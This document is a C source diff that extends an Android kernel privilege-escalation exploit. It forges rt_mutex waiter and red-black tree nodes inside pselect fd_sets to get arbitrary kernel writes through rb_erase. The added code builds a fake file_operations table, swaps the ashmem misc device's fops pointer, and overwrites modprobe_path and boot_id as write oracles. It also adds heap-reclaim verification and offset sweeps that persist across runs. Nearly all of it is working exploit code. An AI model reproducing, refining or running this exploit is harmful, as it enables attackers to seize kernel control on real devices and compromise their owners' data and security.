@@ -111,10 +111,14 @@ uint64_t fdset_get_word(const fd_set *set, int word) {
   return bits[word];
 }
 
+static uintptr_t fops_runtime_text(uint64_t table_off, uint64_t fallback_off);
+
 static int pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
   return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
 }
+
+int pselect_shift_override = -100;
 
 static int pselect_put_global_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
@@ -144,6 +148,11 @@ static void pselect_put_waiter_word(
     fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
     int waiter_word, uint64_t value, const char *name) {
   int shift = env_int_range("PSELECT_SHIFT", PSELECT_WAITER_WORD_SHIFT, -14, 14);
+  {
+    extern int pselect_shift_override;
+    if (pselect_shift_override != -100)
+      shift = pselect_shift_override;
+  }
   int global_word = shift + waiter_word;
   int placed = pselect_put_global_word(
       in, out, ex, words_per_set, global_word, value);
@@ -152,6 +161,25 @@ static void pselect_put_waiter_word(
                "words_per_set=%d nfds=%d\n",
                name, waiter_word, global_word, words_per_set,
                PSELECT_ROUTE_NFDS);
+  }
+}
+
+/* VERIFY_SWAP table-offset sweep index (persisted on /sdcard so fires
+ * continue the sweep across runs). */
+static int vs_x_idx_load(void) {
+  int v = 0;
+  FILE *f = fopen("/sdcard/ghostlock/aarif/vs_x_idx", "r");
+  if (f) {
+    if (fscanf(f, "%d", &v) != 1) v = 0;
+    fclose(f);
+  }
+  return v;
+}
+static void vs_x_idx_store(int v) {
+  FILE *f = fopen("/sdcard/ghostlock/aarif/vs_x_idx", "w");
+  if (f) {
+    fprintf(f, "%d", v);
+    fclose(f);
   }
 }
 
@@ -413,14 +441,164 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
         uint64_t stack_deadline = 0;
         uint64_t stack_lock = fake_lock;
         /*
-         * MODE4_ARISTOTLE / MODE4_WRITE_PROOF (5.10 soralis/aristotle model):
-         * only-left on MAIN tree: parent=write_value, right=0, left=write_target
-         * → *target = value via rb_erase Case-2. Default target is set by main
-         * (boot_id / enforce / fops). Dual PI optional: MODE4_ARISTOTLE_DUAL=1
-         * (can softboot on CPH if open/owner wrong — main-only first).
-         * owner=1 on fake_lock (util) + prio≠task so adjust walks.
+         * MODE4_VERIFY_SWAP (phased, reclaim-safe): g_mode4_chain_phase selects
+         * the stamp. Phase 1 = spray placement oracle (marker write into our
+         * own sprayed table: *(fake_fops+0x90)=fake_fops+0x80), verified by
+         * wproof_spray_verify() after the walk — abort ALIVE if the skb spray
+         * did not reclaim the leaked mm page. Phase 2 = MISC only-left clone
+         * swap (*ashmem_misc.fops = fake_fops). Both phases use a STATIC
+         * all-zero lock slot (nfulnl_loggers+0x40 / +0x60, Image-verified
+         * zeros, runtime-writable .data, inert while ulog unused) when
+         * MODE4_BSS_LOCK=1, so the walk never dereferences spray memory:
+         * wait_lock=0 (trylock ok), waiters empty, owner=0 (clean exit).
+         * One walk per slot (fresh slot per phase) avoids the rb_next/
+         * leftmost hazard of erasing a node from a tree that already links
+         * it. See docs/WALK_DETERMINISM_MASTER_PLAN_2026-08-17.md.
          */
-        if (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0)) {
+        if (env_flag("MODE4_STATIC_CHAIN", 0)) {
+          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
+          /* KIMAGE VA directly (kernel-context write; no P0 alias math) */
+          uint64_t tail =
+              KIMAGE_TEXT_BASE +
+              (uint64_t)(active_offsets ? active_offsets->off_bss_tail_lock
+                                        : 0);
+          struct {
+            uint64_t slot; /* TAIL-relative target (0 = swap MISC) */
+            uint64_t val;  /* value to store */
+          } tab[7];
+          tab[0].slot = 0x50; /* PH-ORDER EXPERIMENT: ioctl first */
+          tab[0].val = fops_runtime_text(
+              active_offsets ? active_offsets->off_ashmem_ioctl : 0,
+              ASHMEM_IOCTL_OFF);
+          tab[1].slot = 0x18;
+          tab[1].val = fops_runtime_text(
+              active_offsets ? active_offsets->off_configfs_bin_write_iter : 0,
+              CONFIGFS_BIN_WRITE_ITER_OFF);
+          tab[2].slot = 0x10;
+          tab[2].val = fops_runtime_text(
+              active_offsets ? active_offsets->off_configfs_read_iter : 0,
+              CONFIGFS_READ_ITER_OFF);
+          tab[3].slot = 0x60;
+          tab[3].val = fops_runtime_text(
+              active_offsets ? active_offsets->off_ashmem_mmap : 0,
+              ASHMEM_MMAP_OFF);
+          tab[4].slot = 0x70;
+          tab[4].val = fops_runtime_text(
+              active_offsets ? active_offsets->off_ashmem_open : 0,
+              ASHMEM_OPEN_OFF);
+          tab[5].slot = 0x80;
+          tab[5].val = fops_runtime_text(
+              active_offsets ? active_offsets->off_ashmem_release : 0,
+              ASHMEM_RELEASE_OFF);
+          tab[6].slot = 0; /* phase 7: the swap itself */
+          tab[6].val = tail;
+          int ti = (ph - 1) % 7;
+          tree_pc = tab[ti].val;
+          tree_r = 0;
+          tree_l = tab[ti].slot ? (tail + tab[ti].slot)
+                                : (KIMAGE_TEXT_BASE +
+                                   (active_offsets
+                                        ? (uint64_t)active_offsets->off_ashmem_misc_fops
+                                        : ASHMEM_MISC_FOPS_OFF));
+          if (env_flag("MODE4_SC_BOOTID_ALL", 0)) {
+            /* per-phase shift sweep: the overlay may be offset vs the
+             * dangling waiter frame; try -2..+4 across phases. */
+            if (env_flag("MODE4_SC_SWEEP", 0)) {
+              extern int pselect_shift_override;
+              static const int sweep[] = {-2, -1, 1, 2, 3};
+              int si = (ph - 1) % 5;
+              pselect_shift_override = sweep[si];
+              pr_info("SC_BOOTID_ALL ph=%d shift=%d\n", ph,
+                      pselect_shift_override);
+            }
+            /* EVERY phase writes a distinct value (tail+ph*8) to bootid:
+             * the final /proc readback shows the LAST landed store. */
+            uint64_t bid_off = (active_offsets && active_offsets->off_slide_boot_id)
+                                   ? (uint64_t)active_offsets->off_slide_boot_id
+                                   : SLIDE_SYSCTL_BOOTID_OFF;
+            tree_l = KIMAGE_TEXT_BASE + bid_off;
+            tree_pc = tail + (uint64_t)ph * 8;
+            if (env_flag("MODE4_SC_MODPROBE", 0)) {
+              /* visible-store oracle: garble modprobe_path (readable via
+               * /proc/sys/kernel/modprobe) - proves stores land. */
+              tree_l = KIMAGE_TEXT_BASE + 0x027E0F78ULL; /* modprobe_path (kallsyms) */
+              pr_info("SC_MODPROBE ph=%d target=modprobe_path%s", ph, "");
+            }
+            pr_info("stack mode4 SC_BOOTID_ALL ph=%d *bootid=tail+%d*8\n",
+                    ph, ph);
+          }
+          pi_parent = 0;
+          pi_right = 0;
+          pi_left = 0;
+          stack_prio = 3;
+          stack_deadline = 0;
+          stack_lock = tail + 0x400 + (uint64_t)(ph - 1) * 0x20;
+          if (env_flag("MODE4_SC_TRAP2", 0)) {
+            /* erase-path trap: nonzero right word -> two-children successor
+             * path -> walks text bytes as rb nodes -> softboot iff the
+             * erase executes. */
+            tree_r = (uint64_t)text_addr(
+                KIMAGE_TEXT_BASE +
+                (active_offsets ? active_offsets->off_ashmem_ioctl : 0));
+          }
+          if (env_flag("MODE4_SC_TRAP", 0)) {
+            /* walk liveness trap: nonzero wait_lock -> trylock spins ->
+             * softboot IF (and only if) the walk reaches [5]. */
+            stack_lock = (uint64_t)text_addr(
+                KIMAGE_TEXT_BASE +
+                (active_offsets ? active_offsets->off_ashmem_ioctl : 0));
+          }
+          pr_info("stack mode4 STATIC_CHAIN ph=%d write *(%016llx)=%016llx "
+                  "lock=%016llx (%s)\n",
+                  ph, (unsigned long long)tree_l, (unsigned long long)tree_pc,
+                  (unsigned long long)stack_lock,
+                  tab[ti].slot ? "table slot" : "*MISC swap");
+        } else if (env_flag("MODE4_VERIFY_SWAP", 0)) {
+          int ph = g_mode4_chain_phase ? g_mode4_chain_phase : 1;
+          if (ph == 1) {
+            tree_pc = (uint64_t)fake_fops + 0x80;
+            tree_r = 0;
+            tree_l = (uint64_t)fake_fops + 0x90;
+            pr_info("stack mode4 VERIFY_SWAP p1 oracle only-left "
+                    "parent=%016llx left=%016llx (*(fake_fops+0x90)=+0x80)\n",
+                    (unsigned long long)tree_pc,
+                    (unsigned long long)tree_l);
+          } else {
+            tree_pc = (uint64_t)fake_fops;
+            tree_r = 0;
+            tree_l = misc;
+            pr_info("stack mode4 VERIFY_SWAP p2 MISC only-left "
+                    "parent=fake_fops=%016llx left=MISC=%016llx\n",
+                    (unsigned long long)tree_pc,
+                    (unsigned long long)tree_l);
+          }
+          pi_parent = 0;
+          pi_right = 0;
+          pi_left = 0;
+          stack_prio = 3;
+          stack_deadline = 0;
+          if (env_flag("MODE4_BSS_LOCK", 1) && active_offsets) {
+            /* Phase 1 slot: init_task+0x878 — wait_lock sits in struct
+             * padding (statically zero, never written), the waiters tree
+             * lands on init_task.pi_waiters (permanently empty: swapper
+             * never PI-blocks), owner lands on pi_top_task (permanently
+             * NULL). Image-verified zeros 2026-08-17.
+             * Phase 2 slot: kernel image tail (__bss_stop+0x134, aligned
+             * 0x02BB9D00) — zero-mapped, unreferenced by any symbol. */
+            uint64_t slot;
+            if (ph == 1) {
+              slot = (uint64_t)active_offsets->off_init_task + 0x878;
+            } else {
+              slot = (uint64_t)active_offsets->off_bss_tail_lock;
+            }
+            stack_lock = data_addr(KIMAGE_TEXT_BASE + slot);
+            pr_info("stack mode4 VERIFY_SWAP p%d BSS lock=%016llx "
+                    "(%s, zeros)\n",
+                    ph, (unsigned long long)stack_lock,
+                    ph == 1 ? "init_task+0x878 pi_waiters"
+                            : "bss-tail __bss_stop+0x134");
+          }
+        } else if (env_flag("MODE4_ARISTOTLE", 0) || env_flag("MODE4_WRITE_PROOF", 0)) {
           /*
            * Shapes (WRITE_PROOF_SHAPE / target):
            *  left (default bootid/enforce): only-left parent=fake_fops left=tgt
@@ -443,7 +621,23 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           else
             use_classic = 0; /* bootid/enforce → only-left */
 
-          if (use_classic) {
+          if (env_flag("MODE4_WPROOF_SPRAY", 0)) {
+            /* Placement oracle (see wproof_spray_verify in util.c): stamp
+             * only-left marker write into our own sprayed table. */
+            tree_pc = (uint64_t)fake_fops + 0x80;
+            tree_r = 0;
+            tree_l = (uint64_t)fake_fops + 0x90;
+            pi_parent = 0;
+            pi_right = 0;
+            pi_left = 0;
+            stack_lock = fake_lock;
+            stack_prio = 3;
+            stack_deadline = 0;
+            pr_info("stack mode4 WPROOF_SPRAY only-left parent=%016llx "
+                    "right=0 left=%016llx (*(fake_fops+0x90)=fake_fops+0x80)\n",
+                    (unsigned long long)tree_pc,
+                    (unsigned long long)tree_l);
+          } else if (use_classic) {
             /* only-right: parent=MISC-8 (black), right=fake_fops → *MISC=fake_fops */
             tree_pc = (misc - 8) & ~3ULL;
             tree_pc |= 1ULL; /* black node — reduce rebalance pressure */
@@ -1040,12 +1234,24 @@ void do_pselect_fake_lock_route(void) {
   int wion = env_flag("MODE4_WION", 0);
   int zio = env_flag("MODE4_ZIO", 0);
   int pad3 = env_flag("MODE4_PAD3", 0);
-  int max_att = pad3 ? 3
-                     : (zio || chain ? 3
-                                    : ((zion || zi || wion)
-                                           ? 2
-                                           : PSELECT_CFI_ROUTE_ATTEMPTS));
-  if (pad3)
+  int vs = env_flag("MODE4_VERIFY_SWAP", 0);
+  int sc = env_flag("MODE4_STATIC_CHAIN", 0);
+  int vs_retries = 0; /* reclaim-loss retries consumed by VERIFY_SWAP */
+  const int VS_MAX_RECLAIM_RETRIES = 4;
+  int max_att = sc ? 7 : (vs ? 2
+                   : (pad3 ? 3
+                          : (zio || chain ? 3
+                                         : ((zion || zi || wion)
+                                                ? 2
+                                                : PSELECT_CFI_ROUTE_ATTEMPTS))));
+  if (sc)
+    pr_info("MODE4_STATIC_CHAIN=1: 7 deterministic walks - build fops "
+            "table in kernel image tail, then *MISC swap. No spray.\n");
+  else if (vs)
+    pr_info("MODE4_VERIFY_SWAP=1: phase1 spray-marker oracle (BSS lock), "
+            "phase2 *MISC=fake_fops clone swap — abort ALIVE if the peek "
+            "verify says the skb reclaim did not land on the leaked mm page\n");
+  else if (pad3)
     pr_info("MODE4_PAD3=1: phase1 MISC+16=0, phase2 MISC+8=0, "
             "phase3 *MISC=fake_fops (pad toxic rb neighbors)\n");
   else if (zio)
@@ -1064,14 +1270,16 @@ void do_pselect_fake_lock_route(void) {
     pr_info("MODE4_CHAIN=1: phase1 ZERO_NAME, phase2 ZERO_OWNER, "
             "phase3 ION_SAFE (same process; rb-leaf fops)\n");
   for (int route_attempt = 1; route_attempt <= max_att; route_attempt++) {
-    if (pad3 || zion || zi || wion || zio || chain)
+    if (sc || vs || pad3 || zion || zi || wion || zio || chain)
       g_mode4_chain_phase = route_attempt;
+    if (sc || vs) /* distinct prio per phase so every walk really runs */
+      consumer_nice = PSELECT_CONSUMER_NICE - (route_attempt - 1);
     else
       g_mode4_chain_phase = 0;
     if (route_attempt != 1) {
       int reuse_page =
-          (chain || zion || zi || wion || zio || pad3) && route_attempt >= 2 &&
-          page_base && fake_fops;
+          (sc || vs || chain || zion || zi || wion || zio || pad3) &&
+          route_attempt >= 2 && page_base && fake_fops;
       if (!reuse_page) {
         page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
         if (!page_base || !fake_lock || !fake_fops) {
@@ -1234,8 +1442,32 @@ void do_pselect_fake_lock_route(void) {
       }
     }
     atomic_store(&punch_consume_go, 0);
-    calls = atomic_load(&consumer_calls);
-    success = atomic_load(&consumer_success);
+    /* The consumer increments calls BEFORE sched_setattr and success only
+     * AFTER its O_SYNC post_setattr logging (milliseconds). Poll briefly so
+     * the snapshot does not race the sequence and misreport the phase. */
+    for (int w = 0; w < 300; w++) {
+      calls = atomic_load(&consumer_calls);
+      success = atomic_load(&consumer_success);
+      if (calls > 0 && success > 0)
+        break;
+      usleep(10000);
+    }
+
+    if (env_flag("MODE4_SC_BOOTID_ALL", 0)) {
+      char bb[48] = {0};
+      char bpath[64];
+      snprintf(bpath, sizeof(bpath), "%s",
+               env_flag("MODE4_SC_MODPROBE", 0)
+                   ? "/proc/sys/kernel/modprobe" : "/proc/sys/kernel/random/boot_id");
+      int bf = open(bpath, O_RDONLY | O_CLOEXEC);
+      if (bf >= 0) {
+        ssize_t rn = read(bf, bb, sizeof(bb) - 1);
+        (void)rn;
+        close(bf);
+      }
+      pr_info("SC_BOOTID_READBACK ph=%d bootid=%.20s\n",
+              route_attempt, bb);
+    }
     pr_info("pselect returned attempt=%d ret=%d errno=%d calls=%d success=%d delay=%d "
             "owner_unlock_done=%d\n",
             route_attempt, ret, saved_errno, calls, success, delay_usec,
@@ -1286,13 +1518,64 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
-    if (chain || zion || zi || wion || zio || pad3) {
+    /*
+     * VERIFY_SWAP gate: after phase 1's oracle walk, peek (non-destructive)
+     * the sprayed stream for the marker at fake_fops+0x90. Only a verified
+     * page (skb reclaim actually landed on the leaked mm page) may proceed
+     * to phase 2's live *MISC swap. On mismatch the reclaim lost the buddy
+     * race — retry the whole mm-churn + spray + oracle (bounded) instead of
+     * burning the fire: each retry is one fresh reclaim gamble, and a lost
+     * gamble costs at most one stray qword in a foreign page.
+     */
+    if (vs && route_attempt == 1) {
+      int v = wproof_spray_verify((uint64_t)fake_fops + 0x80);
+      durable_proof_log(v == 1 ? "vs_phase1_VERIFIED"
+                               : (v == 0 ? "vs_phase1_MISMATCH"
+                                         : "vs_phase1_NOTABLE"));
+      pr_info("VERIFY_SWAP phase1 verify ret=%d (1=page verified)\n", v);
+      if (v != 1 && ++vs_retries < VS_MAX_RECLAIM_RETRIES) {
+        /* Sweep candidate table offsets (leaked 16K page -> table delta):
+         * the IonStack -0xe80 (+0x100 effective) may be wrong on CPH —
+         * try each piece/chunk relationship across retries; persist the
+         * sweep index so the next fire continues where this one stopped. */
+        static const long xs[] = {0x100, 0xF80, -0x80, -0x1080,
+                                  -0x2080, -0x3080, -0x7080, -0xB080};
+        int xi = vs_x_idx_load();
+        if (xi >= (int)(sizeof(xs) / sizeof(xs[0]))) xi = 0;
+        long x = xs[xi];
+        vs_x_idx_store(xi + 1);
+        pr_info("VERIFY_SWAP reclaim lost — retry %d/%d with table X=%+ld "
+                "(sweep idx %d)\n", vs_retries, VS_MAX_RECLAIM_RETRIES, x, xi);
+        page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
+        if (page_base && fake_lock && fake_fops) {
+          fake_fops = page_base + (uintptr_t)x;
+          binwrite_target = fake_fops + 0x700;
+          pr_info("VERIFY_SWAP X applied fake_fops=%016zx "
+                  "binwrite=%016zx\n", fake_fops, binwrite_target);
+          route_attempt = 0; /* for-loop ++ → re-run as phase 1 */
+          continue;
+        }
+        pr_error("VERIFY_SWAP retry page prepare failed\n");
+        cfi_last_step = 41;
+        break;
+      }
+      if (v != 1) {
+        durable_proof_log("vs_reclaim_exhausted_ABORT");
+        cfi_last_step = 40;
+        cfi_last_errno = v;
+        break;
+      }
+    }
+
+    if (sc || vs || chain || zion || zi || wion || zio || pad3) {
       char cbuf[160];
-      const char *tag = pad3 ? "PAD3"
-                             : (zio ? "ZIO"
-                                    : (wion ? "WION"
-                                            : (zi ? "ZI"
-                                                  : (zion ? "ZION" : "CHAIN"))));
+      const char *tag = vs ? "VS"
+                           : (pad3 ? "PAD3"
+                                  : (zio ? "ZIO"
+                                         : (wion ? "WION"
+                                                 : (zi ? "ZI"
+                                                       : (zion ? "ZION"
+                                                               : "CHAIN")))));
       snprintf(cbuf, sizeof(cbuf),
                "%s_phase=%d success=%d calls=%d cfi_step=%d cfi_errno=%d "
                "cfi_wr=%zd",
@@ -1449,6 +1732,11 @@ void do_pselect_fake_lock_route(void) {
         live_sync_log("CHAIN", "phase3_ION_CFI_HIT_possible_fops_swap");
     }
     if (route_quality_miss) {
+      continue;
+    }
+    /* STATIC_CHAIN: every phase's walk IS the goal — continue through the
+     * final swap phase regardless of intermediate probe outcomes. */
+    if (sc && route_attempt < max_att) {
       continue;
     }
     if (route_verified || cfi_dirty_seen || cfi_last_step != 1) {
